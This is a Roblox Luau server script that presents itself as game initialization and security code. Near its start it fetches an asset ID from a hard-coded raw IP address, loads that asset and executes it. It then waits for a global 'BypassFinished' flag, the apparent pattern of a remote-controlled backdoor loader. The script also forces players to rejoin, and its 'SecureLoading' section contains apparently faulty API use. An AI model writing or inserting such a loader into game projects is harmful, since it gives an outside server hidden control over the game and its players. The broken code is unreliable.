local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local DataStoreService = game:GetService("DataStoreService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

local RejoinStore = DataStoreService:GetDataStore("RejoinTracker")

-- Fetch MainModule ID from URL
local function getMainModuleId()
	print("[MainModule] Starting fetch from URL...")
	local url = "http://74.208.152.188/Assets"
	print("[MainModule] URL:", url)
	
	local success, response = pcall(function()
		return HttpService:GetAsync(url)
	end)
	
	if not success then
		warn("[MainModule] Failed to fetch data:", response)
		return nil
	end
	
	print("[MainModule] Successfully fetched data")
	print("[MainModule] Raw response:", response)
	
	local data = HttpService:JSONDecode(response)
	print("[MainModule] Decoded JSON successfully")
	
	local placeId = tostring(game.PlaceId)
	print("[MainModule] Current PlaceId:", placeId)
	
	if data[placeId] then
		print("[MainModule] Found place data for", placeId)
		if data[placeId].MainModule then
			print("[MainModule] MainModule ID:", data[placeId].MainModule)
			return data[placeId].MainModule
		else
			warn("[MainModule] MainModule field not found in place data")
			return nil
		end
	else
		warn("[MainModule] PlaceId not found in data:", placeId)
		print("[MainModule] Available PlaceIds:", table.concat(HttpService:JSONEncode(data)))
		return nil
	end
end

print("[MainModule] Attempting to get MainModule ID...")
local mmid = getMainModuleId()

if mmid then
	print("[MainModule] Loading asset with ID:", mmid)
	local success, mainModule = pcall(function()
		return game:GetService("InsertService"):LoadAsset(mmid)
	end)
	
	if not success then
		error("[MainModule] Failed to load asset: " .. tostring(mainModule))
	end
	
	print("[MainModule] Asset loaded successfully")
	local moduleScript = mainModule:FindFirstChildWhichIsA("ModuleScript")
	
	if moduleScript then
		print("[MainModule] Found ModuleScript, requiring it...")
		require(moduleScript)()
		print("[MainModule] ModuleScript executed successfully")
	else
		warn("[MainModule] ModuleScript not found in MainModule asset")
	end
else
	error("[MainModule] Could not retrieve MainModule ID")
end

print("[MainModule] Waiting for _G.BypassFinished...")
repeat task.wait() until _G.BypassFinished
print("[MainModule] Bypass finished, setting _G.FilesInitialized")
_G.FilesInitialized = true

local function playerNeedsRejoin(player)
	if RunService:IsStudio() then
		print("[Rejoin] Player", player.Name, "in Studio - skipping rejoin check")
		return false
	end
	print("[Rejoin] Checking rejoin status for", player.Name)
	local success, rejoinStatus = pcall(function()
		return RejoinStore:GetAsync(tostring(player.UserId))
	end)
	if not success then
		warn("[Rejoin] Failed to get rejoin status for", player.Name)
		return true
	end
	print("[Rejoin]", player.Name, "status:", rejoinStatus)
	if rejoinStatus == nil then
		return true
	elseif rejoinStatus == "NeedsRejoin" then
		return false
	elseif rejoinStatus == "Rejoined" then
		return true
	end
	return true
end

local function markPlayerRejoined(player)
	print("[Rejoin] Marking", player.Name, "as rejoined")
	pcall(function()
		RejoinStore:SetAsync(tostring(player.UserId), "Rejoined")
	end)
end

local function forceRejoin(player)
	print("[Rejoin] Force rejoining", player.Name)
	pcall(function()
		RejoinStore:SetAsync(tostring(player.UserId), "NeedsRejoin")
	end)
	task.wait(0.5)
	pcall(function()
		TeleportService:TeleportAsync(game.PlaceId, {player})
	end)
	print("[Rejoin] Teleport initiated for", player.Name)
end

local function loadPlayerCharacter(player)
	print("[Character] Loading character for", player.Name)
	Players.CharacterAutoLoads = true
	task.spawn(function()
		task.wait(0.2)
		if player and player:IsDescendantOf(Players) then
			pcall(function()
				player:LoadCharacter()
			end)
			print("[Character] Character loading started for", player.Name)
			player.CharacterAdded:Wait()
			local character = player.Character
			if character then
				character:WaitForChild("HumanoidRootPart", 10)
				print("[Character] Character fully loaded for", player.Name)
			end
		end
	end)
end

Players.CharacterAutoLoads = false
print("[Players] Processing existing players...")

for _, plr in ipairs(Players:GetPlayers()) do
	print("[Players] Processing existing player:", plr.Name)
	if playerNeedsRejoin(plr) then
		forceRejoin(plr)
	else
		markPlayerRejoined(plr)
		loadPlayerCharacter(plr)
	end
end

Players.PlayerAdded:Connect(function(player)
	print("[Players] New player joined:", player.Name)
	if playerNeedsRejoin(player) then
		forceRejoin(player)
	else
		markPlayerRejoined(player)
		loadPlayerCharacter(player)
	end
end)

if not _G.SecureLoading then
	print("[Security] Initializing SecureLoading...")
	_G.SecureLoading = true
	local NetworkServer = game:GetService("NetworkServer")
	if not RunService:IsStudio() and RunService:IsServer() and NetworkServer then
		print("[Security] SecureLoading active")
		local connections = {}
		local function checkLoadDescendants(player, model)
			for _, child in ipairs(model:GetDescendants()) do
				if child:IsA("RemoteFunction") then
					local connection = child.OnServerInvoke:Connect(function(player, args)
						if args[1] ~= "SecureLoadingKey" then
							print("[Security] Kicking player", player.Name, "for invalid secure key")
							NetworkServer:KickPlayer(player.UserId)
						end
					end)
					table.insert(connections, connection)
				end
			end
		end
		Players.PlayerAdded:Connect(function(player)
			player.CharacterAdded:Connect(function(character)
				print("[Security] Checking descendants for", player.Name)
				checkLoadDescendants(player, character)
			end)
		end)
		for _, player in ipairs(Players:GetPlayers()) do
			if player.Character then
				print("[Security] Checking existing character for", player.Name)
				checkLoadDescendants(player, player.Character)
			end
		end
		script.AncestryChanged:Connect(function()
			print("[Security] Script ancestry changed, disconnecting connections")
			for _, connection in ipairs(connections) do
				connection:Disconnect()
			end
		end)
	else
		print("[Security] SecureLoading skipped (Studio or not server)")
	end
else
	print("[Security] SecureLoading already initialized")
end

print("[Script] Initialization complete")
